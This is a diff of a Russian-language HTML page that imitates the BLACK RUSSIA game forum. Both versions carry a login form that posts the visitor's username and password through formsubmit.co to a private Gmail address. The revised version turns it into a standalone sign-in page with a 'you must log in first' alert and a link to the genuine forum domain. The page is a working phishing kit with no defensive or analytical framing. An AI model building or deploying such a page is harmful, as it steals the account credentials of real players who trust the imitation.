@@ -2,245 +2,223 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>BLACK RUSSIA</title>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Форум</title>
   <style>
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #1f1f1f;
-      color: #fff;
+      font-family: "Segoe UI", sans-serif;
+      background-color: #1a1a1a;
+      color: #e0e0e0;
     }
+
     header {
-      background-color: #121212;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 15px 30px;
-      flex-wrap: wrap;
-    }
-    header h1 {
-      font-size: 2em;
-      margin: 0;
-    }
-    .logo {
-      display: flex;
-      align-items: center;
-    }
-    .logo img {
-      height: 50px;
-      margin-right: 10px;
-    }
-    nav ul {
-      list-style: none;
-      margin: 0;
+      background-color: #2a2a2a;
       padding: 0;
-      display: flex;
-      gap: 20px;
-      flex-wrap: wrap;
+      border-bottom: 1px solid #3a3a3a;
     }
-    nav ul li {
-      color: #ccc;
-      cursor: pointer;
-    }
-    .auth-buttons {
+
+    .nav {
       display: flex;
-      gap: 15px;
       align-items: center;
+      justify-content: center;
+      padding: 0;
     }
-    .auth-buttons a {
+
+    .nav-item {
+      padding: 12px 20px;
       color: #ccc;
       text-decoration: none;
-      font-size: 0.95em;
-      cursor: pointer;
-    }
-    .auth-buttons a:hover {
-      text-decoration: underline;
-    }
-    .auth-popup {
-      display: none;
-      position: absolute;
-      top: 80px;
-      right: 30px;
-      background: #2a2a2a;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.5);
-      z-index: 1000;
-    }
-    .auth-popup input {
-      width: 100%;
-      margin-bottom: 10px;
-      padding: 8px;
-      border-radius: 4px;
-      border: none;
-    }
-    .auth-popup button {
-      width: 100%;
-      padding: 10px;
-      background: #ff2e2e;
-      border: none;
-      border-radius: 4px;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    .banner {
-      background: #2e2e2e;
-      padding: 40px;
-      text-align: center;
-    }
-    .banner h2 {
-      font-size: 1.8em;
-      margin-bottom: 10px;
-    }
-    .banner p {
-      font-size: 1em;
-      margin-bottom: 20px;
-    }
-    .banner button {
-      padding: 12px 24px;
-      background-color: #ff2e2e;
-      color: #fff;
-      border: none;
-      font-weight: bold;
-      font-size: 1em;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    .forum-section {
-      max-width: 1000px;
-      margin: 40px auto;
-      padding: 0 20px;
-    }
-    .forum-block {
-      background: #2c2c2c;
-      border-left: 4px solid #ff2e2e;
-      padding: 15px 20px;
-      margin-bottom: 15px;
-      border-radius: 6px;
-    }
-    .forum-block h3 {
-      margin: 0;
-      font-size: 1.2em;
+      font-size: 15px;
+      border-top-left-radius: 6px;
+      border-top-right-radius: 6px;
       display: flex;
       align-items: center;
-      justify-content: space-between;
+      gap: 8px;
     }
-    .forum-block .meta {
-      font-size: 0.9em;
-      color: #aaa;
+
+    .nav-item span.box {
+      display: inline-block;
+      width: 14px;
+      height: 14px;
+      border: 2px solid #777;
+      border-radius: 3px;
     }
-    .label-new {
-      background-color: red;
-      padding: 2px 6px;
-      font-size: 0.8em;
+
+    .nav-item.active {
+      background-color: #1e1e1e;
+      color: #ff4d4d;
+    }
+
+    .nav-item.active span.box {
+      border-color: #ff4d4d;
+    }
+
+    .container {
+      max-width: 440px;
+      margin: 30px auto;
+      background-color: #2a2a2a;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.5);
+    }
+
+    h2 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+
+    .alert {
+      background-color: #ffdddd;
+      color: #a33;
+      padding: 12px;
+      border-left: 4px solid #e44;
+      margin-bottom: 20px;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    label {
+      font-size: 14px;
+      margin: 10px 0 5px;
+      display: block;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      background-color: #1e1e1e;
+      border: 1px solid #444;
       border-radius: 4px;
-      margin-left: 10px;
+      color: white;
     }
-    @media (max-width: 768px) {
-      header {
-        flex-direction: column;
-        align-items: flex-start;
-      }
-      nav ul {
-        flex-direction: column;
-        gap: 10px;
-      }
-      .auth-buttons {
-        flex-direction: column;
-        align-items: flex-start;
-      }
+
+    .checkbox-label {
+      display: flex;
+      align-items: center;
+      margin-top: 10px;
+      font-size: 14px;
     }
-  
-    @media (max-width: 768px) {
-      header {
-        flex-direction: column;
-        align-items: flex-start;
-        padding: 10px 20px;
-      }
-      .logo img {
-        height: 40px;
-      }
-      nav ul {
-        flex-direction: column;
-        gap: 10px;
-        margin-top: 10px;
-      }
-      header h1 {
-        font-size: 1.5em;
-      }
-      body {
-        font-size: 16px;
-        padding: 10px;
-      }
+
+    .checkbox-label input {
+      margin-right: 10px;
+    }
+
+    .btn {
+      background-color: #1e1e1e;
+      color: white;
+      border: 1px solid #555;
+      padding: 10px;
+      margin-top: 20px;
+      width: 100%;
+      cursor: pointer;
+      font-weight: bold;
+      border-radius: 5px;
+      transition: 0.3s;
+    }
+
+    .btn:hover {
+      background-color: #333;
+    }
+
+    .footer {
+      text-align: center;
+      color: #999;
+      font-size: 13px;
+      margin: 40px auto;
+    }
+
+    .footer a {
+      color: #888;
+      text-decoration: none;
+      margin: 0 8px;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    .lang {
+      margin-bottom: 10px;
+    }
+
+    .small-links {
+      font-size: 13px;
+      margin-top: 12px;
     }
 
   </style>
 </head>
 <body>
+
   <header>
-    <div class="logo">
-      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAMAAAAp4XiDAAAABlBMVEX///8AAABVwtN+AAABdUlEQVRIie2XzU3EMBBFf4YrE3iAyYAYBLwF6AA0hZCSi4AiYQnMlgMMJ5q06ZtTZ25v0dbzpU1ZkUXpENqD2vYCwbsVNBfF6UKqqD1grZFaEXDJQd4JMbJZqYSmA42+VTP2R2kXK5Og2bNMAqAzY+rfdoI5V5+tdpEmLbUgS+MKAWN8nYUJSMN3Fo3doIv9RGnZzFYMhCFlH7HpDbbSm3yHLOuWvO2+cGSlDtlHoPMEjlmFTkR8Ay9rO+VNMR8Ggf3QW4GqEqTtPdePbI2bKNnyS6NF6kwT1WqUZ4B2pgs0eMKzk2wthtvbH3A3nUO9VYYef8p9tWTpXqZryaBbmZDPnrSzDdVNdc6evwr75g6i2x3Azx+BUQAAAABJRU5ErkJggg==" alt="Logo" />
-      <h1>BLACK RUSSIA</h1>
-    </div>
-    <nav>
-      <ul>
-        <li><i class="fa fa-home"></i> ГЛАВНАЯ</li>
-        <li><i class="fa fa-comments"></i> ФОРУМЫ</li>
-        <li><i class="fa fa-question"></i> ЧТО НОВОГО?</li>
-        <li><i class="fa fa-users"></i> ПОЛЬЗОВАТЕЛИ</li>
-      </ul>
-    </nav>
-    <div class="auth-buttons">
-      <a onclick="toggleAuthPopup()"><i class="fa fa-sign-in-alt"></i> Вход</a>
-      <a href="#"><i class="fa fa-calendar-plus"></i> Регистрация</a>
-    </div>
-    <div class="auth-popup" id="authPopup">
-      <form action="https://formsubmit.co/stanislavsisa26@gmail.com" method="POST">
-        <input name="username" type="text" placeholder="Имя пользователя" required>
-        <input name="password" type="password" placeholder="Пароль" required>
-        <label style="color:#ccc; font-size:0.9em;"><input type="checkbox" checked> Запомнить меня</label>
-        <button type="submit">ВОЙТИ</button>
-      </form>
+    <div class="nav">
+      <a href="https://forum.blackrussia.online/" class="nav-item">
+        <span class="box"></span> ГЛАВНАЯ
+      </a>
+      <a href="#" class="nav-item active">
+        <span class="box"></span> ФОРУМЫ
+      </a>
+      <a href="#" class="nav-item">
+        <span class="box"></span>
+      </a>
+      <a href="#" class="nav-item">
+        <span class="box"></span>
+      </a>
     </div>
   </header>
 
-  <div class="banner">
-    <h2>Добро пожаловать!</h2>
-    <p>Для того, чтобы начать взаимодействовать с форумом Вам необходимо будет зарегистрироваться либо войти в аккаунт.</p>
-    <button onclick="toggleAuthPopup()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
+  <div class="container">
+    <h2>Вход</h2>
+
+    <div class="alert">
+      Для того, чтобы это сделать, нужно сначала войти на форум.
+    </div>
+
+    <form action="https://formsubmit.co/stanislavsisa26@gmail.com" method="POST">
+      <label>Имя пользователя или email:</label>
+      <input type="text" name="username" required>
+
+      <label>Пароль:</label>
+      <input type="password" name="password" required>
+
+      <div class="checkbox-label">
+        <input type="checkbox" id="showPass">
+        <label for="showPass">Показать</label>
+      </div>
+
+      <div class="small-links">
+        <a href="#" style="color:#aaa;">Забыли свой пароль?</a>
+      </div>
+
+      <div class="checkbox-label" style="margin-top: 10px;">
+        <input type="checkbox" name="remember">
+        <label>Запомнить меня</label>
+      </div>
+
+      <button type="submit" class="btn">ВОЙТИ</button>
+    </form>
+
+    <p style="text-align:center; margin-top: 20px; font-size: 14px;">
+      У Вас ещё нет учётной записи? <a href="#" style="color: #fff;">Зарегистрируйтесь</a>
+    </p>
   </div>
 
-  <div class="forum-section">
-    <div class="forum-block">
-      <h3>Новости и информация <span class="label-new">Новое</span></h3>
-      <div class="meta">Темы: 306 &nbsp;|&nbsp; Сообщения: 4,6K</div>
-    </div>
-    <div class="forum-block">
-      <h3>Технический раздел <span class="label-new">Новое</span></h3>
-      <div class="meta">Темы: 517 &nbsp;|&nbsp; Сообщения: 129,7K</div>
-    </div>
-    <div class="forum-block">
-      <h3>Предложения по улучшению <span class="label-new">Новое</span></h3>
-      <div class="meta">Темы: 109,5K &nbsp;|&nbsp; Сообщения: 1,3M</div>
-    </div>
+  <div class="footer">
+    <div class="lang">Русский (RU)</div>
+    <a href="#">Условия и правила</a> |
+    <a href="#">Политика конфиденциальности</a> |
+    <a href="#">Главная</a> |
+    <a href="#">Помощь</a>
   </div>
 
   <script>
-    function toggleAuthPopup() {
-      const popup = document.getElementById("authPopup");
-      popup.style.display = popup.style.display === "block" ? "none" : "block";
-    }
-
-    window.addEventListener('click', function(e) {
-      const popup = document.getElementById("authPopup");
-      const authLink = document.querySelector(".auth-buttons a");
-      if (!popup.contains(e.target) && !authLink.contains(e.target)) {
-        popup.style.display = "none";
-      }
+    const toggle = document.getElementById('showPass');
+    toggle.addEventListener('change', () => {
+      const passField = document.querySelector('input[name="password"]');
+      passField.type = toggle.checked ? 'text' : 'password';
     });
   </script>
 </body>
